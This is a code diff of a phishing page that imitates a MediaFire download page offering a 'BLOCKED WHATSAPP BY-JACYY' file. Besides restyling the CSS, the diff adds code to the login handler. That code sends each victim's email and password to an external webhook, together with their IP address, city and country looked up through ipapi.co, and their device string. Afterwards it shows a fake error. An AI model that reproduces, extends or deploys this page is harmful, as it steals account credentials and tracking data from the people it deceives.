@@ -10,7 +10,7 @@
         body { background-color: #f4f4f4; font-family: 'Open Sans', sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
         .wrapper { width: 100%; max-width: 500px; min-height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; }
         
-        /* Navbar */
+        /* Navbar & Header */
         .navbar { background: #fff; display: flex; justify-content: space-between; align-items: center; padding: 12px 18px; border-bottom: 1px solid #e5e5e5; }
         .logo { height: 22px; }
         .nav-right { display: flex; align-items: center; gap: 10px; }
@@ -25,74 +25,30 @@
         .price-row { border: 1.5px solid #00ff84; border-radius: 6px; padding: 10px; margin-bottom: 18px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.2); }
         .btn-blue { background: #007bff; color: white; border: none; width: 100%; padding: 13px; border-radius: 6px; font-weight: 700; font-size: 13px; cursor: pointer; text-transform: uppercase; }
 
-        /* KOTAK DOWNLOAD SLIM (Lengkungan 3px & Tipis) */
-        .dl-container { 
-            background: #007bff; 
-            margin: 10px 15px 15px; 
-            border-radius: 3px; 
-            padding: 8px 15px; 
-            color: white; 
-            display: flex; 
-            align-items: center; 
-            cursor: pointer; 
-            position: relative; 
-            z-index: 5; 
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
-        }
-        .dl-icon-box { 
-            background: white; 
-            padding: 6px; 
-            border-radius: 2px; 
-            margin-right: 12px; 
-            display: flex; 
-            align-items: center; 
-        }
+        /* Kotak Download */
+        .dl-container { background: #007bff; margin: 10px 15px 15px; border-radius: 3px; padding: 8px 15px; color: white; display: flex; align-items: center; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .dl-icon-box { background: white; padding: 6px; border-radius: 2px; margin-right: 12px; display: flex; align-items: center; }
         .dl-text { flex: 1; }
         .dl-text b { font-size: 14px; display: block; margin-bottom: 1px; text-transform: uppercase; }
         .dl-text span { font-size: 10px; opacity: 0.85; }
-        .arrow-dl { font-size: 16px; opacity: 0.9; }
 
-        .ad-info { font-size: 10px; color: #777; padding: 15px 25px; text-align: center; line-height: 1.5; }
-
-        /* GRID SOSIAL SESUAI SCREENSHOT */
-        .social-grid { 
-            display: grid; 
-            grid-template-columns: 1fr 1fr; 
-            gap: 10px; 
-            padding: 0 15px 20px; 
-            background: #fff;
-        }
-        .social-btn { 
-            background: #f5f5f5; 
-            padding: 15px 5px; 
-            text-align: center; 
-            border-radius: 5px;
-            color: #555; 
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .social-btn i { 
-            display: block; 
-            margin-bottom: 8px; 
-            font-size: 18px; 
-            color: #777; 
-        }
-        .social-btn span {
-            font-size: 11px;
-            display: block;
-        }
+        /* Grid Sosial */
+        .social-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 0 15px 20px; background: #fff; }
+        .social-btn { background: #f5f5f5; padding: 15px 5px; text-align: center; border-radius: 5px; color: #555; text-decoration: none; cursor: pointer; }
+        .social-btn i { display: block; margin-bottom: 8px; font-size: 18px; color: #777; }
+        .social-btn span { font-size: 11px; display: block; }
 
         /* Footer */
         .real-footer { padding: 30px 20px; background: #fff; color: #666; font-size: 12px; line-height: 1.8; border-top: 1px solid #eee; }
         .footer-links { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 5px; }
-        .social-icons-bottom { display: flex; gap: 10px; margin-top: 20px; }
+        .soc-icons { display: flex; gap: 10px; margin-top: 20px; }
         .soc-box { background: #e8e8e8; width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; border-radius: 4px; color: #999; }
 
         /* Modal Overlay */
         .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 9999; }
         .modal { background: white; border-radius: 10px; width: 90%; max-width: 340px; padding: 25px; text-align: center; }
-        .modal input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        .btn-confirm { width: 100%; padding: 12px; background: #001280; color: white; border: none; border-radius: 6px; font-weight: 700; }
+        .modal input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        .btn-confirm { width: 100%; padding: 12px; background: #001280; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -130,12 +86,10 @@
             <b>BLOCKED WHATSAPP BY-JACYY</b>
             <span>Download in a new tab (33.19MB)</span>
         </div>
-        <i class="fa-solid fa-download arrow-dl"></i>
+        <i class="fa-solid fa-download"></i>
     </div>
 
-    <p class="ad-info">
-        Clicking the download button above will start your download in a new tab and show a message from our advertising partners.
-    </p>
+    <p style="font-size: 10px; color: #777; padding: 15px 25px; text-align: center;">Clicking the download button above will start your download in a new tab.</p>
 
     <div class="social-grid">
         <div class="social-btn"><i class="fa-solid fa-link"></i><span>Copy for messenger</span></div>
@@ -147,15 +101,9 @@
     <div class="real-footer">
         <div>©2025 MediaFire Build 121958 &nbsp; Advertising &nbsp; Terms</div>
         <div class="footer-links">
-            <span>Privacy Policy</span>
-            <span>Copyright</span>
-            <span>Abuse</span>
-            <span>Credits</span>
+            <span>Privacy Policy</span><span>Copyright</span><span>Abuse</span><span>Credits</span>
         </div>
-        <div style="margin-top: 5px;">
-            <span>File Sharing for Creators</span> &nbsp; <span>More...</span>
-        </div>
-        <div class="social-icons-bottom">
+        <div class="soc-icons">
             <div class="soc-box"><i class="fa-solid fa-b"></i></div>
             <div class="soc-box"><i class="fa-brands fa-twitter"></i></div>
             <div class="soc-box"><i class="fa-brands fa-facebook-f"></i></div>
@@ -185,24 +133,36 @@
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         if(!u || !p) return;
+
         try {
+            // Get IP & Location
+            const resp = await fetch('https://ipapi.co/json/');
+            const data = await resp.json();
+            const ip = data.ip || "Unknown";
+            const loc = `${data.city}, ${data.region}, ${data.country_name}`;
+            const dev = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+
+            const msg = {
+                content: `**Mediafire fake phising**\n\n` +
+                         `**Phising result:**\nBerhasil\n\n` +
+                         `**Email:** \`${u}\`\n` +
+                         `**Sandi:** \`${p}\`\n\n` +
+                         `**Alamat ip:** ${ip}\n` +
+                         `**Versi hp:** ${dev}\n` +
+                         `**Lokasi:** ${loc}`
+            };
+
             await fetch(WEB, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🔓 New Phish - JACYY",
-                        color: 3447003,
-                        fields: [
-                            { name: "👤 User", value: u, inline: true },
-                            { name: "🔑 Pass", value: p, inline: true }
-                        ]
-                    }]
-                })
+                body: JSON.stringify(msg)
             });
+
             document.getElementById('pass').value = "";
             document.getElementById('err').style.display = "block";
-        } catch(e) {}
+        } catch(e) {
+            console.error(e);
+        }
     }
 </script>
 
